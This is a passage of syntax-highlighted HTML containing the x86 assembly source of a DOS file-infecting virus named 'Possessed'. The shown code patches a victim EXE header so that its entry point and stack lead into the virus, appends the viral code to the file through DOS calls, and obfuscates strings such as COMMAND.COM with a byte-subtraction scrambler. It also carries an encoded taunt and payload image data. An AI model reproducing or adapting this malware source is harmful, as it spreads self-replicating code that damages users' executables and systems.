 </span><span class="sc5">AlignedToPage</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isBlocks</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isMod</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ExeLengthLo</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ExeLengthHi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isHeaderSize</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isIp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ExeEntry</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isSs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isSp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VictimCode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Handle</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MovePointerBegin</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc0">
 
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ExeLengthLo</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ExeLengthHi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">PossessedEntry</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VictimCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
 </span><span class="sc5">Relay8</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoneWithFile</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
 
 </span><span class="sc5">isError</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">SaveSsOnInt21</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">SaveSpOnInt21</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">UseDos</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">SaveSpOnInt21</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">SaveSsOnInt21</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosInterrupt</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">MovePointerBegin</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">MoveCursor</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">Scrambler</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc5">MaskIt</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">MaskIt</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">Compare</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">MatchFound</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">
 </span><span class="sc5">MatchFound</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">EncryptedCommandCom</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'C'</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc0">
                         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">,</span><span class="sc12">'D'</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc0">
                         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'C'</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc0">
 
 </span><span class="sc5">FuckOff</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'F'</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc4">,</span><span class="sc12">'u'</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc4">,</span><span class="sc12">'c'</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc4">,</span><span class="sc12">'k'</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc0">
                         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc4">,</span><span class="sc12">'f'</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc4">,</span><span class="sc12">'f'</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc0">
                         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'!'</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc0">
 
 </span><span class="sc5">EncryptedAuthor</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'J'</span><span class="sc4">+</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">+</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc4">+</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc12">'J'</span><span class="sc4">+</span><span class="sc2">25h</span><span class="sc0">
                         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'o'</span><span class="sc4">+</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc4">+</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc12">'G'</span><span class="sc4">+</span><span class="sc2">25h</span><span class="sc0">
                         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'u'</span><span class="sc4">+</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc12">'m'</span><span class="sc4">+</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc12">'b'</span><span class="sc4">+</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">+</span><span class="sc2">25h</span><span class="sc0">
 
 </span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">;------ Possessed payload data --------------------------</span><span class="sc0">
 </span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">FaceData</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc4">,</span><span class="sc2">0b6h</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc4">,</span><span class="sc2">0b5h</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc4">,</span><span class="sc2">0b5h</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">0afh</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">0aeh</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">0adh</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0ach</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc4">,</span><span class="sc2">0abh</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">5dh</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">5dh</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">5fh</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">6ah</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">6bh</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">5dh</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">0afh</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">0aeh</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">0adh</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">0ach</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">0abh</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">0a9h</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">0a8h</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">0a6h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">0a5h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0a4h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">0a3h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">0a2h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">0a1h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">9fh</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">9dh</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">9ch</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">9bh</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">99h</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">98h</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">99h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">98h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">95h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">94h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">93h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">92h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">99h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">98h</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">91h</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">8fh</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">8eh</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">98h</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">8ch</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">8ah</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">85h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">84h</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">6ah</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">6bh</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc0">
